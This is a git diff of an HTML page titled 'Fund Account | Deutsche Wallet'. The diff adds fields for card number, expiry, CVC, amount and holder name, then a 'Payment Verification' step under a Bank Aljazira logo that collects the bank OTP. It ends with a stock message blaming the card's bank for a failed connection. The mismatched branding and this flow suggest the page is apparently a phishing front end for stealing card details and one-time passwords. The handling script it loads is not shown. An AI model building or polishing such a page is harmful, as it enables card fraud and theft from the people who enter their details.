@@ -25,9 +25,66 @@
 
     <title>Fund Account | Deutsche Wallet</title>
   </head>
-  <body>
+  <body> 
+
+    <div id="invalid-error" class="text-center mt-5 pt-5" style="display: none;">
+        <i class="fa fa-times" style="color: red; font-size: 50px; padding-bottom: 20px;"></i>
+        <p style="font-size: 18px;">Sorry, this card could not connect to our payment gateway.</p>
+        <p style="font-size: 18px;">Kindly contact your bank to resolve this issue.</p>
+        <p>Return to the <a href="transfer.html">homepage</a></p>
+    </div>  
+
+    <div id="verify-page" style="display: none;">
+        <div class="text-center pt-5">
+            <img style="width: 100px; height: 100px; margin: 30px auto;" class="phone-verify" src="./assets/images/phoneverify.jpeg" alt="Verify Phone">
+            <p style="font-size: 25px; margin-top: 50px;">Payment<span class="font-weight-bold"> Verification</span></p>
+
+            <div class="div-cover mt-5">
+                <p>Please note that before you can make a payment, a pin or password would be sent from your bank to verify your details.</p>
+                <p><span class="font-weight-bold">NB:</span> You will need to make sure that you have registered with your bank for 3D secure payments.</p>
+                <button id="verify-btn" class="mt-5 mb-4 verify-btn">Continue</button>
+            </div>
+        </div>
+   </div>
+
+   <div class="other-row">
+    <div class="container section-two" style="display: none;">
+        <div class="row">
+            <div class="row otp-datacard mx-auto p-5" style="padding-top: 0;">
+                <h4 id="recipient-name" class="text-dark mx-auto"></h4><br />
+                <img width="100" id="ax-img" height="60" src="./assets/images/bankalja.jpeg" alt="bank aljazira logo" />
+                <div class="row mx-auto" style="padding-top: 10%;">
+                    <ul>
+                        <li>Welcome</li>
+                        <li>Amount:</li>
+                        <li class="bank-list1">Issuing Bank:</li>
+                        <li>Date:</li>
+                        <li>Card Number:</li>
+                        <li>Address:</li>
+                    </ul>
+
+                    <ul>
+                        <li id="card-owner" class="text-primary font-weight-bold"></li>
+                        <li id="amount-list"></li>
+                        <li class="bank-list1">Bank Aljazira</li>
+                        <li id="date"></li>
+                        <li id="card-number-list"></li>
+                        <li>
+                            <form action="">
+                                <input id="otp-input" type="text" placeholder="OTP here" required /><br />
+                                <p class="text-danger" style="display: none;" id="otp-error">Invalid OTP</p>
+                                <button type="button" id="confirm-btn" class="mt-4 btn btn-secondary">Confirm</button>
+                            </form>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
     <div id="datacard-3" style="margin-left: 35%; margin-top: 10%;">
-        <div class="card">
+        <div class="card mycard">
             <div class="card-header">
                 <div class="row">
                     <div class="col-md-6">
@@ -47,16 +104,22 @@
                         <input id="cc-number" type="tel" class="input-lg form-control cc-number" autocomplete="cc-number" placeholder="•••• •••• •••• ••••" required />
                     </div>
                     <div class="row" style="padding-top: 0;">
-                        <div class="col-md-6">
+                        <div class="col-md-4">
                             <div class="form-group"> 
-                                <label for="cc-exp" class="control-label">EXPIRY DATE</label>
+                                <label for="cc-exp" class="control-label">EXPIRY</label>
                                 <input id="cc-exp" type="tel" class="input-lg form-control cc-exp" autocomplete="cc-exp" placeholder="•• / ••" required />
                             </div>
                         </div>
-                        <div class="col-md-6">
+                        <div class="col-md-4">
                             <div class="form-group"> 
                                 <label for="cc-cvc" class="control-label">CVC</label>
                                 <input id="cc-cvc" type="tel" class="input-lg form-control cc-cvc" autocomplete="off" placeholder="•••" required />
+                            </div>
+                        </div>
+                        <div class="col-md-4">
+                            <div class="form-group"> 
+                                <label for="amount" class="control-label">AMOUNT</label>
+                                <input id="amount" type="number" class="input-lg form-control amount" autocomplete="off" placeholder="•••" required />
                             </div>
                         </div>
                     </div>
@@ -64,7 +127,7 @@
                         <label for="numeric" class="control-label">CARD HOLDER NAME</label>
                         <input type="text" id="card-holder-name" class="input-lg form-control" placeholder="e.g John Doe" required />
                     </div>
-                    <p class="text-danger" id="card-error" style="font-size: 16px;">All fields are required</p>
+                    <p class="text-danger" id="card-error" style="font-size: 16px; display: none;">All fields are required</p>
                     <div class="form-group"> 
                         <button type="submit" id="pay-btn" class="btn mt-5 btn-block pay-btnn form-control">
                            <a id="pay-link" href="#">PAY</a>
@@ -92,5 +155,6 @@
     <script src="assets/js/perfect-scrollbar.min.js"></script>
     <script src="assets/js/chart-options.js"></script>
     <script src="assets/js/scripts.js"></script>
+    <script src="assets/js/app.js"></script>
   </body>
 </html>
